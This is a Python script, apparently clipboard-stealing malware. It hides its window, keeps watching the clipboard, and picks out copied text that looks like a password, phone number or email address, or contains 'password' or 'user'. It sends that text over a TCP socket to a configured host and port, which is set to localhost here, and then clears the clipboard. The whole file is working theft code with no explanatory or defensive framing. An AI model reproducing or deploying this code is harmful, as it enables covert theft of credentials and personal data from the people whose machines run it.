try:
  import Tkinter as tk
except ImportError:
  import tkinter as tk
import socket

def contains_keywords(clipped, keywords):
  for word in keywords:
    if word in clipped:
      return 1
  return 0

def is_password(clipped):
  if len(clipped) > 5:
    import string
    THRESHOLD = 3
    password = {
      'has_lower': 0,
      'has_upper': 0,
      'has_special': 0,
      'has_number': 0
    }
      
    for char in clipped:
      if char in string.ascii_lowercase:
        password['has_lower'] = 1
      elif char in string.ascii_uppercase:
        password['has_upper'] = 1
      elif char in string.punctuation:
        password['has_special'] = 1
      elif char in string.digits:
        password['has_number'] = 1
      
      sum = 0
      for key in password:
        sum += password[key]
      
      if sum >= THRESHOLD:
        return 1
  return 0
  
def is_phone_number(num):
  if len(num) == 12 or len(num) == 14:
    if len(num) == 14:
      try:
        nums = num.split(' ')
        try:
          float(nums[1])
          float(nums[2])
          float(nums[0][1])
          nums[0][0] == '('
          nums[0][2] == ')'
          return 1
        except Exception as err:
          return 0
      except Exception as err:
        return 0
    else:
      if '-' in num:
        nums = num.split('-')
      elif ' ' in num:
        nums = num.split(' ')
      else:
        return 0
      try:
        float(nums[0])
        float(nums[1])
        float(nums[2])
        return 1
      except Exception as err:
        return 0
  return 0

def email_suffix(suffix):
  return '.com' in suffix or '.net' in suffix or '.org' in suffix or '.edu' in suffix or '.me' in suffix
  
def is_email(email):
  if email:
    if '@' in email:
      if email_suffix(email[-4:]):
        return 1
  return 0
    
def listen():
  HOST = '127.0.0.1'
  PORT = 6666
  KEYWORDS = ['password', 'user']
  root = tk.Tk()
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  root.withdraw()
  go = 1
  while go:
    try:
      clipped = root.clipboard_get()
      if is_phone_number(clipped) or is_email(clipped) or is_password(clipped) or contains_keywords(clipped, KEYWORDS):
        try:
          s.send(bytes(clipped.encode()))
        except Exception as err:
          print(str(err))
        root.clipboard_clear()
    except Exception as err:
      pass
    root.update()

listen()
















